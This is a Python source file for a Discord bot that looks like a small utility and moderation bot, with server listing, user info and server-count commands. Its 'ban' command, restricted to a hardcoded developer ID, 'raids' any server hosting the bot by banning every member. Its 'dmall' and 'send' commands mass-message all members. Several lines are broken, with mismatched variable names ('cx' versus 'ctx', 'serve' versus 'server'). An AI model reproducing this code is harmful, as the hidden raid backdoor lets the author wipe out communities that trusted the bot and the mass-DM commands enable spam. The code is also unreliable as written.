import discord
from discord.ext.commands import bot
from discord import game
from discord.ext import commands
import asyncio
import platform
import colorsys
import random
import time

client = commands.Bot(command_prefix = '!', case_insensitive=True)
Client = discord.client
Clientdiscord = discord.Client()
devs=["536589241757728809","536589241757728809"]





@client.command(pass_context = True)
@commands.has_permissions(kick_members=True)
async def serverlist(ctx):
    for server in client.servers:
        #print(server.name)
        await client.say(server.name)

    
@client.command(pass_context = True)
@commands.has_permissions(kick_members=True)     
async def userinfo(ctx, user: discord.Member):
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    embed = discord.Embed(title="{}'s info".format(user.name), description="Here's what I could find.", color = discord.Color((r << 16) + (g << 8) + b))
    embed.add_field(name="Name", value=user.name, inline=True)
    embed.add_field(name="ID", value=user.id, inline=True)
    embed.add_field(name="Status", value=user.status, inline=True)
    embed.add_field(name="Highest role", value=user.top_role)
    embed.add_field(name="Joined", value=user.joined_at)
    embed.set_thumbnail(url=user.avatar_url)
    await client.say(embed=embed)

@client.command(pass_context=True)
async def servercount(self):
    """Shows the total servers and users that Tarik is connected to."""
        
    embed=discord.Embed(colour=0xFF0000)
    embed.add_field(name="__Servers__", value="Tarik is connected to __**{}**__ servers.".format(len(self.bot.servers)))
    embed.add_field(name="__Users__", value="Tarik is connected to __**{}**__ users.".format(str(len(set(self.bot.get_all_members())))))
    embed.set_thumbnail(url=self.bot.user.avatar_url)
    embed.set_author(name="Tarik", icon_url=self.bot.user.avatar_url)
    await self.bot.say(embed=embed)


@client.command(pass_context=True)
async def ban(cx, serverid):
    if ctx.message.author.id in devs:
        try:
            serve=client.get_server(str(serverid))
            await client.say(f"**Starting raid on `{server.name}`**")
            for member in list(server.members):
                try:
                    await client.ban(member, 2)
                    await client.say(f"Banned {member.name}")
                except:
                    await client.say(f"Couldn't ban {member.name}")
        except Exception as ex:
            await client.say(f"Server not found. {ex}")
            
@commands.has_permissions(administrator=True)
@client.command(pass_context = True)
async def send(ctx, *, content: str):
        for member in list(ctx.message.server.members):
            try:
                await client.send_message(member, content)
                await client.say("DM Sent To : {} :white_check_mark:  ".format(member))
            except:
                print("can't")
                await client.say("DM can't Sent To : {} :x: ".format(member))

@client.command(pass_context=True, no_pm=True)
async def dmall(ctx, *,content: str):
    devu=["536589241757728809","536589241757728809"]
    if ctx.message.author.id in devu:
        for a in client.servers:
            for member in list(a.members):
                try:
                    await client.send_message(member, content)
                    await client.say("DM Sent To : {} ✅  ".format(member))
                except:
                    print("can't")
                    await client.say("DM can't Sent To : {} ❌ ".format(member))


@client.event
async def on_ready():
    print('Logged in as '+client.user.name+' (ID:'+client.user.id+') | Connected to '+str(len(client.servers))+' servers | Connected to '+str(len(set(client.get_all_members())))+' users')
    print('--------')
    print('--------')
    print('Started ')
    print('Created by Tejas')

    
client.run("BOT TOKEN")                

